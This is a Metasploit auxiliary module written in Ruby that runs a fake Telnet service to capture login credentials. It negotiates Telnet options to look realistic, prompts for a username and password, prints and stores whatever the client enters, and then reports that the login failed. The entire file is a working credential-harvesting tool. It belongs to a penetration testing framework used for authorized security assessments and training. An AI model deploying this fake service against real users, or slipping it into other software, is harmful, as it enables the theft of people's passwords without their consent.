##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Fake Telnet Service - Kris Katterjohn 09/28/2008
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: Telnet',
      'Description' => %q{
        This module provides a fake Telnet service that
      is designed to capture authentication credentials.  DONTs
      and WONTs are sent to the client for all option negotiations,
      except for ECHO at the time of the password prompt since
      the server controls that for a bit more realism.
      },
      'Author' => 'kris katterjohn',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run telnet capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [true, 'The local port to listen on.', 23]),
        OptString.new('BANNER', [false, 'The server banner to display when client connects'])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def banner
    datastore['BANNER'] || 'Welcome'
  end

  def run
    exploit
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      user: nil,
      pass: nil,
      gotuser: false,
      gotpass: false,
      started: false
    }
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    offset = 0

    if data[0] == 0xff
      0.step(data.size, 3) do |x|
        break if data[x] != 0xff

        # Answer DONT/WONT for WILL/WONTs and DO/DONTs,
        # except for echoing which we WILL control for
        # the password

        reply = "\xff#{data[x + 2].chr}"

        if @state[client][:pass] && (data[x + 2] == 0x01)
          reply[1] = "\xfb"
        elsif (data[x + 1] == 0xfb) || (data[x + 1] == 0xfc)
          reply[1] = "\xfe"
        elsif (data[x + 1] == 0xfd) || (data[x + 1] == 0xfe)
          reply[1] = "\xfc"
        end

        client.put reply

        offset += 3
      end
    end

    if !@state[client][:started]
      client.put "\r\n#{banner}\r\n\r\n"
      @state[client][:started] = true
    end

    if @state[client][:user].nil?
      client.put 'Login: '
      @state[client][:user] = ''
      return
    end

    return if offset >= data.size

    data = data[offset, data.size]

    if !@state[client][:gotuser]
      @state[client][:user] = data.strip
      @state[client][:gotuser] = true
      client.put "\xff\xfc\x01" # WON'T ECHO
    end

    if @state[client][:pass].nil?
      client.put 'Password: '
      @state[client][:pass] = ''
      return
    end

    if !@state[client][:gotpass]
      @state[client][:pass] = data.strip
      @state[client][:gotpass] = true
      client.put "\x00\r\n"
    end

    print_good("TELNET LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
    client.put "\r\nLogin failed\r\n\r\n"
    report_cred(
      ip: @state[client][:ip],
      port: datastore['SRVPORT'],
      service_name: 'telnet',
      user: @state[client][:user],
      password: @state[client][:pass]
    )
    client.close
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_close(client)
    @state.delete(client)
  end
end
